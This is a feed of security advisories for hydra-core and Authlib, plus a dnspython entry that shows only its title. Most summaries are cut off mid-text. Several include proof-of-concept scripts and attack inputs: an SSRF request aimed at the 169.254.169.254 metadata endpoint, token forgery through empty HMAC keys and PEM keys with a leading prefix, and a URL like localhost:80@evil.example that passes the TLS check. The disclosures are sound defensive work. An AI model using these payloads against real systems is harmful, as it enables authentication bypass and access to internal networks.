items.title: [hydra-core] Hydra legacy target blacklist permits unsafe PyYAML loading
items.summary: SummaryHydra's legacy target blacklist omits PyYAML's unsafe loading surfaces. If anapplication passes attacker-controlled targets and arguments to instantiate(),a target such as yaml.unsafe_load can execute Python code through aconfig-controlled YAML stream containing Python object-construction tags.Impact and prerequisitesThe attacker must control the relevant target and arguments that the applicationinstantiates. The configured callable executes with the application's processprivileges. This is a gap in the best-effort legacy blacklist. It is not a bypassof Hydra 1.4's execution whitelist supplied by trusted Python code.One realistic exposure is a model downloaded from a third-party repository,such as Hugging Face, that bundles attacker-controlled configuration. When avictim loads the model using application code that passes this configurationto legacy Hydra instantiation without effective target restrictions, themodel's metadata can execute code in the victim process. This model-loadingattack pattern is documented in the original Hydra advisoryGHSA-2cp2-2r3c-7p7r and the associated Unit 42 research. It does not imply thatall Hugging Face models or currently patched downstream loaders are affected.Hydra 1.3's blacklist is defense in depth, not a complete security boundary.Hydra 1.4 is affected on its deprecated no-whitelist legacy path. Installedapplication wrappers can perform indirect operations beyond a name-basedblacklist's coverage; this fix does not make arbitrary configuration safe.The unsafe_load finding is directly reproduced. PyYAML 6.0.3 full_load rejectsthe demonstrated python/object/apply payload, so the finding does not claim thatall PyYAML loading APIs execute that payload.RemediationThe fix blocks the yaml. target namespace except for the exact yaml.safe_load,yaml.safe_load_all, yaml.safe_dump, and yaml.safe_dump_all functions. Loaderclasses, constructor registration, general dump/load APIs, and other targets inthe namespace remain blocked. Existing canonical-identity checks also coveraliases. The fix preserves Hydra 1.4's explicit unsafe opt-out for trusted use.WorkaroundsDo not pass untrusted configuration to instantiate() or call(). For Hydra 1.4,supply a narrow execution whitelist from trusted Python code. Do not letuntrusted configuration select its own execution policy or opt out of checks.Affected releasesThe reported incomplete-remediation stable range is hydra-core 1.3.6 through1.3.7. The 1.4 prerelease legacy path is also affected, including 1.4.0.dev9,1.4.0.dev10, 1.4.0rc1, and 1.4.0rc2. The related blacklist advisoryGHSA-rqx7-p7vv-w7hr was first patched in 1.3.6 and 1.4.0.dev9; these rangesdescribe the remaining omission after that remediation.CreditReported by zx (@manus-pi).Referenceshttps://github.com/hydra-ecosystem/hydra/security/advisories/GHSA-757g-8w3h-hp29https://github.com/hydra-ecosystem/hydra/commit/9a7a9a287d565311183da3392bee4345a7fab6d7https://github.com/hydra-ecosystem/hydra/commit/de5554320c17cd2d974492c03d0b1456adb4a8efhttps://github.com/hydra-ecosystem/hydra/releases/tag/v1.3.8https://github.com/hydra-ecosystem/hydra/releases/tag/v1.4.0rc3https://github.com/advisories/GHSA-wf6j-7hvr-gr93

items.title: [Authlib] Authlib accepts an empty HMAC key, allowing JWS/JWT signature forgery (HS256/HS384/HS512)
items.summary: Reporter: Cavan Loughran, Celvex Group Inc.SummaryAuthlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).This is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.Affected versionsAuthlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.Root cause (exact code location, release tag v1.7.2)authlib/jose/rfc7518/oct_key.py, class OctKey:validate_raw_key is a type-only check: return isinstance(key, bytes). An empty bytes object passes.import_key rejects only keys whose material starts with known unsafe prefixes (if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...), i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.get_op_key loads the raw key without validating its length.No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:prepare_key: return OctKey.import_key(raw_data).sign / verify call key.get_op_key(...) then hmac.new(op_key, msg, self.hash_alg) / hmac.compare_digest(...). With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.Why this is a real signature bypassAn empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.Reproduction (prose, no weaponized exploit)In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.No live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.Proof the fix is known-good (no novelty risk)The same maintainer's newer JOSE library, joserfc, ALREADY rejects empty oct key material outright. In src/joserfc/_rfc7518/oct_key.py, import_key raises a ValueError on empty oct material, with an explicit note that an empty oct key produces a deterministic HMAC digest that any party can reproduce, allowing trivial signature forgery in JWS HS256/HS384/HS512 verification. (joserfc additionally warns on keys below 112 bits.) The same guard is simply absent from the older, far more widely deployed Authlib rfc7518 package. The flagship Python JOSE libraries also guard: PyJWT raises InvalidKeyError('HMAC key must not be empty.') for zero-length keys, and jwcrypto enforces an RFC 7518 minimum key length.ImpactToken forgery / authentication bypass in OAuth 2.0 resource servers and OIDC relying parties built on Authlib whenever the HMAC verification key can be empty at runtime. An attacker can mint tokens with arbitrary claims (for example elevated scopes or another user's subject) that pass signature verification.Suggested remediationReject empty oct key material in OctKey.import_key (and/or validate_raw_key), exactly

items.title: [authlib] Authlib: Unvalidated request_uri fetch in JWT-secured authorization request (JAR) leading to SSRF
items.summary: SummaryAuthlib's RFC 9101 (JAR) extension passes the attacker-controlled request_uri authorization parameter straight to the get_request_object() fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (request_uris client metadata and require_request_uri_registration server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted requests.get(request_uri). Deployments following the documented pattern get an unauthenticated SSRF primitive. DetailsVerified against authlib 1.7.2 and current main. All line numbers below are from authlib/oauth2/rfc9101/authorization_server.py.The extension registers itself on the before_get_authorization_grant hook (lines 62-65), so it runs on every authorization request before any user or client authentication. support_request_uri defaults to True (line 58).The only gate before the sink is that client_id names an existing client (lines 91-103). A client_id is a public, non-secret identifier.The sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:def _get_raw_request_object(self, request: OAuth2Request) -> str:    if "request_uri" in request.payload.data:        raw_request_object = self.get_request_object(            request.payload.data["request_uri"]        )        if not raw_request_object:            raise InvalidRequestUriError(state=request.payload.state)get_request_object is abstract (line 213, raise NotImplementedError() at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):def get_request_object(self, request_uri: str):    try:        return requests.get(request_uri).text    except requests.Exception:        return NoneTwo points sharpen this beyond a generic documentation issue:The allowlist already exists and is ignored. Authlib validates request_uris as client metadata (authlib/oauth2/rfc7591/claims.py:319) and require_request_uri_registration as server metadata (authlib/oauth2/rfc8414/models.py:263). The rfc9101 package contains zero references to either name, so the pre-registration model is never enforced at the point of use.RFC 9101 §10.4.1 asks for controls that are absent. It states the server should "a) check that the value of the request_uri parameter does not point to an unexpected location, b) check that the media type of the response is application/oauth-authz-req+jwt, c) implement a timeout for obtaining the content of request_uri, and d) not perform recursive GET on the request_uri." The extension implements none of these and the documented example implements none of them either.The two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises InvalidRequestUriError (invalid_request_uri, lines 162-163), while a successful fetch of non-JWT content raises InvalidRequestObjectError (invalid_request_object, line 186).PoCThis demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.python -m venv .venv && .venv/bin/pip install authlibfrom authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Requestfrom authlib.oauth2.rfc9101 import JWTAuthenticationRequestreached = []class Extension(JWTAuthenticationRequest):    def get_request_object(self, request_uri):        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here        return None    def resolve_client_public_key(self, client):        return {"keys": []}    def get_server_metadata(self):        return {}    def get_client_require_signed_request_object(self, client):        return Falseclass AuthorizationServer:    def query_client(self, client_id):        return object()uri = "http://169.254.169.254/latest/meta-data/"request = OAuth2Request("GET", "https://as.example/authorize")request.payload = BasicOAuth2Payload({"client_id": "demo", "request_uri": uri})try:    Extension().parse_authorization_request(AuthorizationServer(), request)except Exception as exc:    print("error:", type(exc).__name__)print("fetch hook received:", reached)Output on authlib 1.7.2:error: InvalidRequestUriErrorfetch hook received: ['http://169.254.169.254/latest/meta-data/']Against a deployment that used the docstring implementation, the equivalent unauthenticated request is:GET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2FReturning a fetched-but-non-JWT body instead of None in the snippet above yields InvalidRequestObjectError rather than InvalidRequestUriError, showing the oracle that distinguishes a reachable target from an unreachable one.ImpactServer-side request forgery, reac

items.title: [authlib] Authlib: ID token can disable its own nonce validation via the nonce_supported claim
items.summary: SummaryOpenIDMixin.parse_id_token() reads the nonce_supported claim from the ID token it is validating. When that claim is boolean false, the expected nonce is set to None and nonce validation is skipped for that token.An ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.The code is identical in authlib/integrations/base_client/sync_openid.py:82-83 and authlib/integrations/base_client/async_openid.py:84-85, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).Preconditions: the ID token must carry a valid signature and pass iss and aud validation, and the attacker must be able to supply it to parse_id_token(). Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling parse_id_token() directly, are affected.DetailsAffected codeauthlib/integrations/base_client/sync_openid.py:80-85, in parse_id_token():claims = claims_cls(token.claims, token.header, claims_options, claims_params)# https://github.com/authlib/authlib/issues/259if claims.get("nonce_supported") is False:    claims.params["nonce"] = Noneclaims.validate(leeway=leeway)authlib/integrations/base_client/async_openid.py:82-86 contains the same code.Source of the claimclaims is constructed from token.claims, which is the decoded payload of the ID token passed to parse_id_token():token = jwt.decode(    token["id_token"],    key=key_set,    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),)...claims = claims_cls(token.claims, token.header, claims_options, claims_params)claims.get("nonce_supported") therefore resolves against the ID token payload. It is not read from load_server_metadata(), from client configuration, or from any other source under the relying party's control.Effect on validationIDToken.validate_nonce() at authlib/oidc/core/claims.py:69-83 performs the comparison only when the expected value is truthy:nonce_value = self.params.get("nonce")if nonce_value:    if "nonce" not in self:        raise MissingClaimError("nonce")    if nonce_value != self["nonce"]:        raise InvalidClaimError("nonce")Assigning claims.params["nonce"] = None makes nonce_value falsy, so both the presence check and the equality check are skipped. No error is raised and claims.validate() completes normally.The docstring of that same method states the requirement:If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.Trigger conditionThe comparison is is False, so only a JSON boolean false activates the branch. A string value "false" does not, and nonce validation proceeds normally in that case.OriginThe branch was added in commit 3ca7333c ("Skip verifying nonce for Apple case") to accommodate a provider that emits a nonce_supported claim, as referenced by the inline comment pointing to issue #259.RemediationRead the flag from server metadata or client configuration rather than from the token:metadata = self.load_server_metadata()if metadata.get("nonce_supported") is False:    claims.params["nonce"] = NoneThis preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.Proof of conceptEnvironmentauthlib 1.8.0, commit c529a61a (tag v1.8.0)Python 3.14joserfc 1.7.5No network access requiredgit clone https://github.com/authlib/authlib.git && cd authlibgit checkout c529a61apython3 -m venv .venv.venv/bin/pip install -e . joserfc==1.7.5.venv/bin/python poc.pyConfigurationThe relying party is a subclass of the shipped OpenIDMixin supplying only client_id and load_server_metadata(). fetch_jwk_set() returns metadata["jwks"] directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.The signing key is a generated RSA key. All three tokens are signed with it, carry iss and aud matching the relying party configuration, and are within their validity window. The relying party's session nonce is nonce-the-rp-actually-generated; every token carries the different nonce nonce-from-the-captured-token.poc.pyfrom joserfc import jwtfrom joserfc.jwk import RSAKeyfrom authlib.integrations.base_client.sync_openid import OpenIDMixinISSUER = "https://as.example"CLIENT_ID = "rp-client"KEY = RSAKey.generate_key(2048, parameters={"kid": "k1"})JWKS = {"keys": [KEY.as_dict(private=False)]}class RP(OpenIDMixin):    client_id = CLIENT_ID    def load_server_metadata(self):        return {"issuer": ISSUER, "jwks": JWKS}def id_token(nonce, sub="victim", nonce_supported=None):    claims = {"iss": ISSUER, "sub": sub, "aud": CLIENT_ID,              "iat": 1000000000, "exp": 4000000000, "auth_t

items.title: [authlib] Authlib: Default JWT bearer grant accepts assertions for the wrong audience
items.summary: DescriptionSummaryAuthlib's default RFC 7523 JWT bearer grant leaves get_audiences() empty, so verify_claims() only checks that an aud claim exists instead of requiring it to match the current authorization server's token endpoint. An attacker holding a legitimately issued JWT assertion for any audience can present it to a different authorization server sharing the same signing key and obtain an access token.To be completely transparent, AI tools helped surface it. However, we have independently reproduced and carefully validated the issue. We follow responsible disclosure practices and are sharing this privately.Affected Entrypointsauthlib.oauth2.rfc7523.JWTBearerGrant — default get_audiences() returns empty listauthlib.jose.jwt.decode() with claims_options for audience validationauthlib.integrations.flask_oauth2.ResourceProtector.validate_request() when audience checking is enabledExploit Path1. Attacker authenticates to Service A (low-privilege)2. Authorization server issues JWT with "aud": "https://evil.test/token"3. Attacker presents this assertion to Service B's token endpoint4. Service B uses default JWTBearerGrant (get_audiences() = [])5. verify_claims() only checks aud *exists*, not its value6. Service B issues an access token — audience bypass achievedProof of Concept#!/usr/bin/env python3"""Demonstrates that the default JWTBearerGrant accepts JWT assertionswhose audience does not match the token endpoint, while a strictaudience override correctly rejects them."""import jsonimport osimport sysfrom joserfc.jwk import KeySet, OctKeyWRONG_AUDIENCE = "https://evil.test/token"EXPECTED_AUDIENCE = "https://provider.test/token"GRANT_TYPE = "urn:ietf:params:oauth:grant-type:jwt-bearer"def build_and_exercise(strict_audience: bool) -> tuple[int, dict]:    from authlib.oauth2.rfc7523 import JWTBearerGrant as BaseJWTBearerGrant    # Uses Authlib's own Flask test fixtures    from tests.flask.test_oauth2.models import Client, User, db    from tests.flask.test_oauth2.oauth2_server import (        create_authorization_server, create_flask_app,    )    class JWTBearerGrant(BaseJWTBearerGrant):        def resolve_issuer_client(self, issuer):            return Client.query.filter_by(client_id=issuer).first()        def resolve_client_public_key(self, client):            return KeySet([                OctKey.import_key("foo", {"kid": "1"}),                OctKey.import_key("bar", {"kid": "2"}),            ])        def authenticate_user(self, subject):            return None        def has_granted_permission(self, client, user):            return True        # Only override get_audiences when testing strict mode        if strict_audience:            def get_audiences(self):                return [EXPECTED_AUDIENCE]    app = create_flask_app()    os.environ["AUTHLIB_INSECURE_TRANSPORT"] = "true"    with app.app_context():        db.init_app(app)        db.create_all()        user = User(username="demo-user")        db.session.add(user)        db.session.commit()        client = Client(            user_id=user.id,            client_id="client-id",            client_secret="client-secret",        )        client.set_client_metadata({            "scope": "profile",            "redirect_uris": ["https://client.test/authorized"],            "grant_types": [GRANT_TYPE],        })        db.session.add(client)        db.session.commit()        server = create_authorization_server(app)        server.register_grant(JWTBearerGrant)        # Sign assertion with WRONG audience        assertion = JWTBearerGrant.sign(            "foo",            issuer="client-id",            audience=WRONG_AUDIENCE,  # <-- Not the expected audience            subject=None,            header={"alg": "HS256", "kid": "1"},        )        rv = app.test_client().post(            "/oauth/token",            data={"grant_type": GRANT_TYPE, "assertion": assertion},        )        body = json.loads(rv.data)        db.session.remove()        db.drop_all()        return rv.status_code, bodydef main() -> int:    # Test 1: Default grant (no audience enforcement)    vuln_status, vuln_body = build_and_exercise(strict_audience=False)    # Test 2: Strict audience grant (correct behavior)    strict_status, strict_body = build_and_exercise(strict_audience=True)    result = {        "wrong_audience": WRONG_AUDIENCE,        "expected_audience": EXPECTED_AUDIENCE,        "vulnerable_status": vuln_status,        "vulnerable_body": vuln_body,        "strict_status": strict_status,        "strict_body": strict_body,    }    print(json.dumps(result, indent=2, sort_keys=True))    if (        vuln_status == 200        and "access_token" in vuln_body        and strict_body.get("error") == "invalid_grant"    ):        print(            "POC_SUCCESS: default JWTBearerGrant issued an access token for "            "an assertion whose aud did not match the token endpoint, while "            "strict audience validation rejected the same assertion."        )        return 0    prin

items.title: [authlib] Authlib: OpenID implicit grant checks raw scope instead of allowed scope before issuing ID tokens
items.summary: Report metadataFieldValuePackageauthlib (PyPI, pkg:pypi/authlib)Repositoryhttps://github.com/authlib/authlibComponentauthlib.oidc.core.grants.implicit.OpenIDImplicitGrant.validate_authorization_requestVulnerability classAuthorization bypass: a client's scope restriction is bypassed for OpenID Connect ID token issuanceVerified againstc529a61af40e3efe05286140e00fbdced07d7987 (v1.8.0). Earlier releases were not checked.API surfacePublic API (OpenIDImplicitGrant, registered with server.register_grant(...))Affected in default configurationYes. No non-default option is needed once OpenIDImplicitGrant is registered. Client metadata decides exposure: Authlib's standard ClientMixin checks response type and scope independently, so a client can be permitted id_token responses without being allowed the openid scope.SummaryOpenIDImplicitGrant.validate_authorization_request() first runs the parent ImplicitGrant validation, which filters the requested scope through client.get_allowed_scope() and stores the result in request.scope. It then decides whether this is an OpenID request by checking the raw, client-supplied request.payload.scope instead of that filtered value. A client that is allowed profile but not openid can therefore request scope=openid profile, pass the check, and receive a signed ID token (with sub and profile claims) once the user consents. This happens even when Authlib's built-in, scope-filtering BearerTokenGenerator is in use.The tainted input is the authorization request's scope parameter. The OAuth client fully controls it, and the client is the very party the scope restriction is meant to constrain. Any registered client can add openid to its request if it is permitted an id_token or id_token token response type and its allowed scopes exclude openid but include a claim-bearing scope such as profile.Sibling paths treat the same client correctly, which suggests the raw-scope check is a bug rather than intended behaviour:ImplicitGrant.validate_authorization_request() -> filters the requested scope through client.get_allowed_scope() into request.scope (safe, authlib/oauth2/rfc6749/grants/implicit.py lines 141-147)OpenIDImplicitGrant.validate_authorization_request() -> checks the raw request.payload.scope (unsafe, authlib/oidc/core/grants/implicit.py line 72)UserInfoEndpoint -> rejects the same client's access token with 403 insufficient_scope (safe; observed during verification, line not recorded)OIDC authorization code flow -> issues no id_token for the same client (safe; observed during verification, line not recorded)ImpactA registered OAuth client that the operator has excluded from the openid scope can get an OpenID Connect ID token for any user who logs in and approves its authorization request. During verification the provider returned an RS256-signed ID token carrying iss, aud (the requesting client), nonce, auth_time, at_hash, sub and name, while the granted scope was only profile. A consent page built the way the Authlib docs show lists only profile, so the user is not shown that an identity token will be issued.Without this bug, the same request fails with InvalidScopeError ("Missing 'openid' scope") because the client's resolved scope does not include openid. The new capability is the ID token itself: a signed assertion of the user's identity (sub) plus claims from the client's other allowed scopes. Gating that token is exactly what the openid scope is for. The access token stays restricted when the built-in token generator is used: Authlib's UserInfoEndpoint rejects it with 403 insufficient_scope.Scoring note: we did not compute a CVSS score. An initial triage rated this High. After dynamic verification we assess practical severity as closer to Medium, because:The attacker must be a registered client that is permitted id_token response types.The user must log in and consent.The ID token's aud is the attacking client.Two kinds of deployment are not affected:Deployments that use only the OIDC authorization code flow. During verification, that flow issued no ID token for the same client.Deployments where every client permitted an id_token or id_token token response type is also allowed the openid scope.PreconditionsThe authorization server registers OpenIDImplicitGrant (or a subclass), e.g. server.register_grant(MyOpenIDImplicitGrant). The vulnerable method runs on every OIDC implicit authorization request.A client's metadata permits an OIDC implicit response type (id_token or id_token token). Nothing in Authlib ties this to the openid scope. The standard SQLAlchemy ClientMixin checks response type and scope independently, and it filters requested scopes against the client's allowed scopes at authlib/integrations/sqla_oauth2/client_mixin.py:124-129.That client's allowed scopes exclude openid but include another claim-bearing scope, such as profile.The attacker controls that registered client and sends an authorization request that adds openid to otherwise allowed scopes (e.g. scope=openid prof

items.title: [authlib] Authlib incomplete algorithm-confusion fix permits HMAC forgery with prefixed public keys
items.summary: SummaryOctKey.import_key() carries the only guard that stops an asymmetric public key from being used as anHMAC secret in authlib.jose. That guard is raw_key.startswith(POSSIBLE_UNSAFE_KEYS) — anchored atbyte 0 — while the loader that consumes the identical bytes on the asymmetric path(cryptography.hazmat.primitives.serialization.load_pem_public_key / load_pem_x509_certificate)skips anything before the -----BEGIN line. A PEM public key or X.509 certificate carrying oneleading byte — a newline, a space, four spaces of indentation, a UTF-8 BOM, or a comment line — istherefore not recognised, falls through, and becomes the HMAC secret. An attacker holding only theissuer's public key then mints an HS256 token with arbitrary claims that jwt.decode() accepts asauthentic.This is an incomplete fix of CVE-2024-37568 / GHSA-5357-c2jx-v7qh. That advisory's fix is exactlythis guard (git log -S 'POSSIBLE_UNSAFE_KEYS' -- authlib/jose/rfc7518/oct_key.py returns a singlecommit, 3bea812 "fix: prevent OctKey to import ssh/rsa/pem keys", referencing issue #654), and theoriginal attack works again unchanged whenever the stored PEM does not start at offset 0.Reproduced end-to-end on 1.8.0, the newest release (published 2026-08-30), and on origin/main(c529a61), with cryptography 50.0.2.PreconditionsBoth are deployment properties; neither is attacker-controlled at request time, and the attacker needsno secret and no user interaction.The relying party uses the documented module-level jwt object. from authlib.jose import jwtis built at authlib/jose/__init__.py:55-72 with the full list["HS256","HS384","HS512","RS256",...,"EdDSA"], and JsonWebToken.decode(authlib/jose/rfc7519/jwt.py:80) exposes no algorithms parameter, so a caller of thedocumented object has no way to narrow it. This is the first code sample indocs/jose/jwt.rst:21-31.This hazard is already documented: docs/jose/jwt.rst:73-79 says"This decoding method is insecure. By default jwt.decode parses the alg header. This allowssymmetric macs and asymmetric signatures.", and docs/jose/jwt.rst:94-98 says "You should nevercombine symmetric (HS) and asymmetric (RS, ES, PS) signature schemes." The point of this report isnot that the mixed list exists — it is that the oct_key.py:81 backstop shipped for preciselythat documented hazard does not hold.The verification key is passed as PEM/certificate text whose bytes do not begin at offset 0 with-----BEGIN . Each of the following forms was confirmed to forge, and each also still verifies agenuine RS256/ES256 token with the identical bytes, so nothing in the deployment looks broken:one leading newline — what a triple-quoted Python literal producesone leading spacefour-space indentation — an indented YAML/JSON/TOML config blocka UTF-8 BOM — a Windows-editor artifacta leading comment lineall of the above applied to an X.509 CERTIFICATE PEM instead of a PUBLIC KEY PEMA raw DER SPKI blob also bypasses the guard, but DER cannot be used for genuine asymmetricverification through this path, so I exclude it as a non-deployable configuration and mention itonly as further evidence of the recogniser/loader gap.Detailsauthlib/jose/rfc7518/oct_key.py:10-17POSSIBLE_UNSAFE_KEYS = (    b"-----BEGIN ",    b"---- BEGIN ",    b"ssh-rsa ",    b"ssh-dss ",    b"ssh-ed25519 ",    b"ecdsa-sha2-",)authlib/jose/rfc7518/oct_key.py:78-84raw_key = to_bytes(raw)# security checkif raw_key.startswith(POSSIBLE_UNSAFE_KEYS):    raise ValueError("This key may not be safe to import")key = cls(raw_key=raw_key, options=options)bytes.startswith is anchored. The loader on the asymmetric path is not:authlib/jose/rfc7517/_cryptography_key.py:22-29 calls load_pem_public_key /load_pem_x509_certificate, both of which scan forward for the armour header. So the set of bytestrings the recogniser rejects is strictly smaller than the set the loader accepts, and the differenceis exploitable.Reach, for a caller of the documented object:authlib/jose/rfc7518/jws_algs.py:59 — HMACAlgorithm.prepare_key(raw_data) returnsOctKey.import_key(raw_data); this is the whole of the HMAC key handling.authlib/jose/rfc7519/jwt.py:80 — JsonWebToken.decode(self, s, key, claims_cls=None, claims_options=None, claims_params=None); the algorithm comes from the token header and is checkedonly against the instance's list.authlib/jose/__init__.py:55-72 — that list contains both HS* and RS*/ES*/PS*/EdDSA.So oct_key.py:81 is the only thing between a mixed allow-list and using the public key as an HMACsecret, and it is bypassed by a single leading byte.PoCpoc-authlib-e2e-http.py stands up a Flask API whose only authentication is the documentedjwt.decode(token, PUBLIC_KEY), where PUBLIC_KEY is the issuer's RSA public key embedded as atriple-quoted Python literal (hence one leading newline). The attacker is given only that publickey.authlib=1.8.0 cryptography=50.0.2 flask=3.1.3guard  = authlib/jose/rfc7518/oct_key.py:81   raw_key.startswith(POSSIBLE_UNSAFE_KEYS)call   = authlib/jose/rfc7519/jwt.py:80       JsonWebTok

items.title: [authlib] Authlib: is_secure_transport() loopback exemption can be bypassed with a userinfo component, allowing cleartext-HTTP URLs to non-loopback hosts
items.summary: Summaryauthlib.common.security.is_secure_transport() is used throughout Authlib to enforce the OAuth 2.0 / OIDC requirement that endpoint and redirect URIs use TLS, with an RFC 8252 §7.3 exemption for loopback http:// URIs. The check is implemented as a textual str.startswith prefix match, so a URL such as http://localhost:80@evil.example/cb — whose actual host is evil.example and whose scheme is plain http — is accepted as "secure". An attacker who can supply a URL to any of the sinks that rely on this check (OIDC RP-Initiated Logout dynamic client registration, RFC 8414 authorization-server metadata validation, error-redirect rendering) can smuggle a cleartext non-loopback URL past the TLS-required guard. This is a defense-in-depth / spec-conformance failure; severity is low.DetailsAffected versions: authlib >= 0.13, <= 1.7.2 (all releases containing the loopback prefix exemption; verified against 1.7.2, the current latest)The vulnerable function, from authlib/common/security.py at v1.7.2:13  def is_secure_transport(uri):14      """Check if the uri is over ssl."""15      if os.getenv("AUTHLIB_INSECURE_TRANSPORT"):16          return True1718      uri = uri.lower()19      return uri.startswith(20          ("https://", "http://localhost:", "http://127.0.0.1:", "http://[::1]:")21      )Per RFC 3986 §3.2 the authority component of a URI is [ userinfo "@" ] host [ ":" port ]. The URL http://localhost:80@evil.example/cb therefore has userinfo localhost:80 and host evil.example. Because the check is a raw prefix match against the full URL string, the http://localhost: prefix matches the userinfo portion and the function returns True even though the scheme is http and the host is an arbitrary external name. The trailing : in each allow-list entry — presumably intended to force a host:port shape and reject http://localhost.evil.com — is also satisfied by the user:password separator inside userinfo, so http://localhost:@evil.example/ matches too. The same construction works against all three loopback prefixes (http://127.0.0.1:...@evil.example/, http://[::1]:...@evil.example/).is_secure_transport() is consumed at the following locations in v1.7.2, none of which independently reject URLs containing a userinfo component:authlib/oidc/rpinitiated/registration.py:50-57 — validation of post_logout_redirect_uris during OIDC dynamic client registration for public clients (token_endpoint_auth_method == "none"). The preceding is_valid_url() check (authlib/common/urls.py:142-146) only requires parsed.scheme and parsed.hostname and does not reject userinfo, so the crafted URL passes both guards. A public client can therefore register http://localhost:80@attacker.example/cb as a post-logout redirect target; the OpenID Provider will later 302 the end-user's browser to that cleartext non-loopback URL (carrying state).authlib/oauth2/rfc8414/models.py:61,75,100,115,123,248,284 — validation of issuer, authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint, revocation_endpoint, introspection_endpoint in Authorization Server Metadata / OIDC Discovery documents. A relying party using AuthorizationServerMetadata.validate() would accept endpoint values of this form as satisfying the "MUST use https" requirement when they do not.authlib/oidc/rpinitiated/discovery.py:12 — validation of end_session_endpoint in provider metadata.authlib/oauth2/rfc6749/errors.py:64 and authlib/oauth1/rfc5849/errors.py:33 — governs how redirect_uri is rendered in error bodies (cosmetic).The http://localhost: prefix was introduced in commit 0225c86b (first released in v0.13); http://127.0.0.1: and http://[::1]: were added later in the 1.6.x line. All variants share the same prefix-match weakness.PoCAgainst the current latest release (1.7.2):python3 -m venv venv./venv/bin/pip install 'authlib==1.7.2'./venv/bin/python poc.pypoc.py:#!/usr/bin/env python3"""is_secure_transport() must return True only for https:// URLs, or http://URLs whose host is a loopback address (localhost / 127.0.0.1 / ::1).Bypass: http://localhost:80@evil.example/cb has host 'evil.example'(userinfo = 'localhost:80') per RFC 3986, but matches the prefix'http://localhost:' and is therefore accepted as secure."""from urllib.parse import urlparsefrom authlib.common.security import is_secure_transportcases = [    "http://localhost:80@evil.example/cb",    "http://127.0.0.1:80@evil.example/cb",    "http://localhost:@evil.example/cb",]vulnerable = Falsefor url in cases:    parsed = urlparse(url)    ok = is_secure_transport(url)    print(f"is_secure_transport({url!r}) = {ok}  "          f"[actual host = {parsed.hostname!r}, scheme = {parsed.scheme!r}]")    if ok and parsed.hostname not in ("localhost", "127.0.0.1", "::1") and parsed.scheme != "https":        vulnerable = Trueif vulnerable:    print("\nVULNERABLE: is_secure_transport() returned True for a plain-HTTP "          "URL whose host is NOT a loopback address.")else:    print("\nNOT VULNERABLE")assert vulnerable, "expected bypa

items.title: [dnspython] dnspython dns.name.from_wire_parser() excessive CPU use
